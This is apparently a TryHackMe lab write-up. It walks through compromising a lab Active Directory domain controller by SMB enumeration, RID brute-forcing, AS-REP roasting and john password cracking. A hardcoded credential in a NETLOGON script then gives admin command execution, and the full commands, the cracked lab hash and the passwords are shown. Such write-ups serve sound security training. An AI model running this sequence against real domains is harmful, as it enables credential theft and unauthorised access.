
<h1 align="center">VulnNet: Roasted</h1>

<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/a7d1b069-774d-4cd1-8b39-0bddddcc5a055"><br>
June 11, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure,<br>
part of my <code>401</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
VulnNet Entertainment quickly deployed another management instance on their very broad network.<a href="https://tryhackme.com/room/vulnnetroasted"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/f6e8b9de-8345-4114-b2bd-aed648f013a9"></p>


<h2>Task 2 . Vulnet: Roasted</h2>

<h3>nmap</h3>
<p><code>vulnnet-rst.local0</code></p>

```bash
~# rustscan -a 10.10.109.147 --ulimit 5500 -b 65535 -- -A -Pn
...
Open 10.10.109.147:53
Open 10.10.109.147:88
Open 10.10.109.147:139
Open 10.10.109.147:389
Open 10.10.109.147:445
Open 10.10.109.147:464
Open 10.10.109.147:135
Open 10.10.109.147:593
Open 10.10.109.147:3268
Open 10.10.109.147:5985
Open 10.10.109.147:9389
Open 10.10.109.147:49666
Open 10.10.109.147:49668
Open 10.10.109.147:49670
Open 10.10.109.147:49671
Open 10.10.109.147:49677
Open 10.10.109.147:49710
...
ORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain?       syn-ack
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-06-11 23:07:55Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49671/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         syn-ack Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/11%Time=684A0C51%P=x86_64-alpine-linux-musl%r
SF:(DNSVersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07ver
SF:sion\x04bind\0\0\x10\0\x03");
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| nbstat: NetBIOS name: WIN-2BO8M1OE1M1, NetBIOS user: <unknown>, NetBIOS MAC: 02:84:90:d0:75:a1 (unknown)
| Names:
|   WIN-2BO8M1OE1M1<00>  Flags: <unique><active>
|   WIN-2BO8M1OE1M1<20>  Flags: <unique><active>
|   VULNNET-RST<00>      Flags: <group><active>
|   VULNNET-RST<1c>      Flags: <group><active>
| Statistics:
|   02 84 90 d0 75 a1 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 52358/tcp): CLEAN (Timeout)
|   Check 2 (port 24889/tcp): CLEAN (Timeout)
|   Check 3 (port 35416/udp): CLEAN (Timeout)
|   Check 4 (port 53478/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-11T23:10:11
|_  start_date: N/A

```

<h3>smbclient</h3>

```bash
:~# smbclient -N -L 10.10.109.147 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
SMB1 disabled -- no workgroup available
```

<h3>smbmap</h3>

```bash
~# smbmap -u anonymous -H 10.10.109.147
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.109.147...
[+] IP: 10.10.109.147:445	Name: 10.10.109.147                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	.                                                  
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	InitShutdown
	fr--r--r--                5 Sun Dec 31 23:58:45 1600	lsass
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	scerpc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-364-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	epmapper
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-208-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	eventlog
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-290-0
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	wkssvc
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	atsvc
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	TermSrv_API_service
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	Ctx_WinStation_API_service
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	SessEnvPublicRpc
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-3e0-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-278-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-278-1
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	RpcProxy\49671
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	4d7bce8fe425105b
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	RpcProxy\593
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	srvsvc
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	spoolss
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-820-0
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	winreg
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	netdfs
	fr--r--r--                4 Sun Dec 31 23:58:45 1600	W32TIME_ALT
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-264-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-974-0
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	Amazon\SSM\InstanceData\health
	fr--r--r--                3 Sun Dec 31 23:58:45 1600	Amazon\SSM\InstanceData\termination
	fr--r--r--                1 Sun Dec 31 23:58:45 1600	Winsock2\CatalogChangeListener-948-0
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	SYSVOL                                            	NO ACCESS	Logon server share 
	.                                                  
	dr--r--r--                0 Sat Mar 13 03:21:04 2021	.
	dr--r--r--                0 Sat Mar 13 03:21:04 2021	..
	fr--r--r--              758 Sat Mar 13 03:21:04 2021	Business-Manager.txt
	fr--r--r--              654 Sat Mar 13 03:21:04 2021	Business-Sections.txt
	fr--r--r--              471 Sat Mar 13 03:21:04 2021	Business-Tracking.txt
	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing
	.                                                  
	dr--r--r--                0 Sat Mar 13 03:19:59 2021	.
	dr--r--r--                0 Sat Mar 13 03:19:59 2021	..
	fr--r--r--              467 Sat Mar 13 03:19:59 2021	Enterprise-Operations.txt
	fr--r--r--              503 Sat Mar 13 03:19:59 2021	Enterprise-Safety.txt
	fr--r--r--              496 Sat Mar 13 03:19:59 2021	Enterprise-Sync.txt
	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing
```

<h3>smbclient</h3>

```bash
~# smbclient -N \\\\10.10.109.147\\VulnNet-Business-Anonymous
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar 13 02:46:40 2021
  ..                                  D        0  Sat Mar 13 02:46:40 2021
  Business-Manager.txt                A      758  Fri Mar 12 01:24:34 2021
  Business-Sections.txt               A      654  Fri Mar 12 01:24:34 2021
  Business-Tracking.txt               A      471  Fri Mar 12 01:24:34 2021

		8771839 blocks of size 4096. 4530572 blocks available
smb: \> get Business-Manager.txt
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (49.3 KiloBytes/sec) (average 49.3 KiloBytes/sec)
smb: \> get Business-Sections.txt
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (63.9 KiloBytes/sec) (average 55.2 KiloBytes/sec)
smb: \> get Business-Tracking.txt
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (41.8 KiloBytes/sec) (average 51.1 KiloBytes/sec)
smb: \> quit
```

```bash
:~# smbclient -N \\\\10.10.109.147\\VulnNet-Enterprise-Anonymous
ry "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar 13 02:46:40 2021
  ..                                  D        0  Sat Mar 13 02:46:40 2021
  Enterprise-Operations.txt           A      467  Fri Mar 12 01:24:34 2021
  Enterprise-Safety.txt               A      503  Fri Mar 12 01:24:34 2021
  Enterprise-Sync.txt                 A      496  Fri Mar 12 01:24:34 2021

		8771839 blocks of size 4096. 4499618 blocks available
smb: \> get Enterprise-Operations.txt
getting file \Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \> get Enterprise-Safety.txt
getting file \Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (17.5 KiloBytes/sec) (average 1.9 KiloBytes/sec)
smb: \> get Enterprise-Sync.txt
getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (13.1 KiloBytes/sec) (average 13.1 KiloBytes/sec)
smb: \>
```

<p>Business-Sections.txt<br>
<code>Alexa Whitehat</code> = <code>core business manager</code><br>
<code>you\u2019ve</code><br>
<code>We\u2019re</code><br>
<code>you\u2019re</code><br>
<code>core business manager</code> call <code>1337 0000 7331</code></p>

</p>

<h3>cat</h3>

```bash
:~# cat Business-Manager.txt
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her. 
We understand that when you\u2019ve got questions, especially when you\u2019re on a tight proposal deadline, you NEED answers. 
Our customer happiness specialists are at the ready, armed with friendly, helpful, timely support by email or online messaging.
We\u2019re here to help, regardless of which you plan you\u2019re on or if you\u2019re just taking us for a test drive.
Our company looks forward to all of the business proposals, we will do our best to evaluate all of your offers properly. 
To contact our core business manager call this number: 1337 0000 7331

~VulnNet Entertainment
~TryHackMe
```

<p>Business-Sections.txt<br>
<code>Jack Goldenhand</code> = <code>business unrelated proposals</code><br>
<code>VulNet</code></p>

```bash
:~# cat Business-Sections.txt
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Jack Goldenhand is the person you should reach to for any business unrelated proposals.
Managing proposals is a breeze with VulnNet. We save all your case studies, fees, images and team bios all in one central library.
Tag them, search them and drop them into your layout. Proposals just got... dare we say... fun?
No more emailing big PDFs, printing and shipping proposals or faxing back signatures (ugh).
Your client gets a branded, interactive proposal they can sign off electronically. No need for extra software or logins.
Oh, and we tell you as soon as your client opens it.

~VulnNet Entertainment
~TryHackMe
```

<p>Business-Tracking.txt</p>

```bash
:~# cat Business-Tracking.txt
VULNNET TRACKING
~~~~~~~~~~~~~~~~~~

Keep a pulse on your sales pipeline of your agency. We let you know your close rate,
which sections of your proposals get viewed and for how long,
and all kinds of insight into what goes into your most successful proposals so you can sell smarter.
We keep track of all necessary activities and reach back to you with newly gathered data to discuss the outcome. 
You won't miss anything ever again. 

~VulnNet Entertainment
```

<p>Enterprise-Operations.txt<br>
<code>doesn\u2019t</code></p>


```bash
:~# cat Enterprise-Operations.txt
VULNNET OPERATIONS
~~~~~~~~~~~~~~~~~~~~

We bring predictability and consistency to your process. Making it repetitive doesn\u2019t make it boring. 
Set the direction, define roles, and rely on automation to keep reps focused and make onboarding a breeze.
Don't wait for an opportunity to knock - build the door. Contact us right now.
VulnNet Entertainment is fully commited to growth, security and improvement.
Make a right decision!

~VulnNet Entertainment
~TryHackMe
```

<p>Enterprise-Safety.txt<br>
<code>Tony Skid</code> = <code>core security manager</code><br>
<code>we\u2019ve</code><br>
<code>Alcatraz</code><br>
<code>128-bit SSL encryption</code><br>
<code>nothing\u2019s</code></p>


```bash
~# cat Enterprise-Safety.txt
VULNNET SAFETY
~~~~~~~~~~~~~~~~

Tony Skid is a core security manager and takes care of internal infrastructure.
We keep your data safe and private. When it comes to protecting your private information...
we\u2019ve got it locked down tighter than Alcatraz. 
We partner with TryHackMe, use 128-bit SSL encryption, and create daily backups. 
And we never, EVER disclose any data to third-parties without your permission. 
Rest easy, nothing\u2019s getting out of here alive.

~VulnNet Entertainment
~TryHackMe
```

<p>Enterprise-Sync.txt<br>
<code>Johnny Leet</code><br>
<code>sync manager</code> call <code>7331 0000 1337</code></p>

```bash
:~# cat Enterprise-Sync.txt
VULNNET SYNC
~~~~~~~~~~~~~~

Johnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.
Proposals are just one part of your agency sales process. We tie together your other software, so you can import contacts from your CRM,
auto create deals and generate invoices in your accounting software. We are regularly adding new integrations.
Say no more to desync problems.
To contact our sync manager call this number: 7331 0000 1337

~VulnNet Entertainment
~TryHackMe
```

<h3>crackmapexec</h3>

```bash
~# crackmapexec smb 10.10.109.147 -u 'guest' -p '' --rid-brute | users.txt
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\guest: 
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  512: VULNNET-RST\Domain Admins (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  513: VULNNET-RST\Domain Users (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  514: VULNNET-RST\Domain Guests (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  515: VULNNET-RST\Domain Computers (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  516: VULNNET-RST\Domain Controllers (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  517: VULNNET-RST\Cert Publishers (SidTypeAlias)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  518: VULNNET-RST\Schema Admins (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  525: VULNNET-RST\Protected Users (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  526: VULNNET-RST\Key Admins (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)
```

<h3>cat</h3>

```bash
~# cat users.txt | grep SidTypeUser
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  500: VULNNET-RST\Administrator (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  501: VULNNET-RST\Guest (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  502: VULNNET-RST\krbtgt (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1105: VULNNET-RST\a-whitehat (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1109: VULNNET-RST\t-skid (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1110: VULNNET-RST\j-goldenhand (SidTypeUser)
SMB         10.10.109.147   445    WIN-2BO8M1OE1M1  1111: VULNNET-RST\j-leet (SidTypeUser)
```

```bash
~# cat u.txt | grep SidTypeUser | awk '{print $5}'
500:
501:
502:
1000:
1104:
1105:
1109:
1110:
1111:
```

```bash
:~# cat u.txt | grep SidTypeUser | awk '{print $6}'
VULNNET-RST\Administrator
VULNNET-RST\Guest
VULNNET-RST\krbtgt
VULNNET-RST\WIN-2BO8M1OE1M1$
VULNNET-RST\enterprise-core-vn
VULNNET-RST\a-whitehat
VULNNET-RST\t-skid
VULNNET-RST\j-goldenhand
VULNNET-RST\j-leet
```

```bash
~# cat u.txt | grep SidTypeUser | awk '{print $6}' | cut -d "\\" -f2
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

<h3>usernames.txt</h3>

```bash
~# cat usernames.txt
Administrator
Guest
krbtgt
WIN-2BO8M1OE1M1$
enterprise-core-vn
a-whitehat
t-skid
j-goldenhand
j-leet
```

<h3>Users´  summary</h3>
<p><code>Alexa Whitehat</code> : <code>a-whitehat</code><br>
<code>Jack Goldenhand</code> : <code>j-goldenhand</code><br>
<code>Tony Skid</code> : <code>t-skid</code><br>
<code>Johnny Leet</code> : <code>j-leet</code></p>

<h3>GetNPUsers</h3>

```bash
~# python3.9 /opt/impacket/build/scripts-3.9/GetNPUsers.py vulnnet-rst.local/ -dc-ip 10.10.109.147 -usersfile usernames.txt -no-pass -request -outputfile kerberos-users-discovered
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set

```

```bash
:~# cat kerberos-users-discovered
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:a4f19dd62929fee4f56becbfab8c4018$ba0d427fe7d313ed74c49abe9e8ec3d748c40687fb88178c8e59c2e8b8e4d58e83187be6725102c2404b60094f2f048c9f7887364e918f2d57e46cb1a1f44ceb5bbd2f7c52dd375b94a8a38bdfdf360bef431d9834627dbe68f59f6f71f2cd1a4c971a40e9f1d1cea04a01166394f4fcac1406434bf3ceb5fd917d70506d01399810859315cbb67539a7f9048f0d803c21f2413e6fb2340be5abfe6c2615bb8c43052df46e3e6813522807901741ab87bbb790b6124e16abf937c9684736f85264ddb803dd50548054197da167fbd64b9c23814de28d038d67c46a2ba0701a3a8d58030cba6977c17674c49aa7fb819645644a7ee439
```

<h3>John</h3>

<p><code>t-skid</code> : <code>tj072889*</code></p>

```bash
~# john --wordlist=/usr/share/wordlists/rockyou.txt kerberos-users-discovered
Warning: detected hash type "krb5asrep", but the string is also recognized as "krb5asrep-aes-opencl"
Use the "--format=krb5asrep-aes-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)
1g 0:00:00:09 DONE (2025-06-12 00:57) 0.1095g/s 348137p/s 348137c/s 348137C/s tj3902087..tj021502
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

<h3>smbclient</h3>

```bash
~# smbclient -U t-skid \\\\10.10.178.156\\NETLOGON
Password for [WORKGROUP\t-skid]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 23:15:49 2021
  ..                                  D        0  Tue Mar 16 23:15:49 2021
  ResetPassword.vbs                   A     2821  Tue Mar 16 23:18:14 2021

		8771839 blocks of size 4096. 4512565 blocks available
smb: \> get ResetPassword.vbs
getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (24.2 KiloBytes/sec) (average 24.2 KiloBytes/sec)
smb: \> quit
```


<p><code>strUserNTName = "a-whitehat"</code> : <code>strPassword = "bNdKVkjv3RR9ht"</code></p>

```bash
:~# cat ResetPassword.vbs
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")

' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)

' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.
On Error Resume Next
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
' Escape any forward slash characters, "/", with the backslash
' escape character. All other characters that should be escaped are.
strUserDN = Replace(strUserDN, "/", "\/")

' Bind to the user object in Active Directory with the LDAP provider.
On Error Resume Next
Set objUser = GetObject("LDAP://" & strUserDN)
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
objUser.SetPassword strPassword
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "Password NOT reset for " &vbCrLf & strUserNTName
    Wscript.Echo "Password " & strPassword & " may not be allowed, or"
    Wscript.Echo "this client may not support a SSL connection."
    Wscript.Echo "Program aborted"
    Wscript.Quit
Else
    objUser.AccountDisabled = False
    objUser.Put "pwdLastSet", 0
    Err.Clear
    objUser.SetInfo
    If (Err.Number <> 0) Then
        On Error GoTo 0
        Wscript.Echo "Password reset for " & strUserNTName
        Wscript.Echo "But, unable to enable account or expire password"
        Wscript.Quit
    End If
End If
On Error GoTo 0

Wscript.Echo "Password reset, account enabled,"
Wscript.Echo "and password expired for user " & strUserNTName
```

<h3>a-whitehat</h3>

```bash
root@ip-10-10-18-199:~# crackmapexec smb 10.10.178.156 -u a-whitehat -p bNdKVkjv3RR9ht -d vulnnet-rst.local -x "whoami /all"
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  [+] Executed command via wmiexec
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  USER INFORMATION
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  ----------------
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  User Name              SID
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  ====================== =============================================
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  vulnnet-rst\a-whitehat S-1-5-21-1589833671-435344116-4136949213-1105
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  GROUP INFORMATION
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  -----------------
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  Group Name                                         Type             SID                                          Attributes
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  ================================================== ================ ============================================ ===============================================================
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  BUILTIN\Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
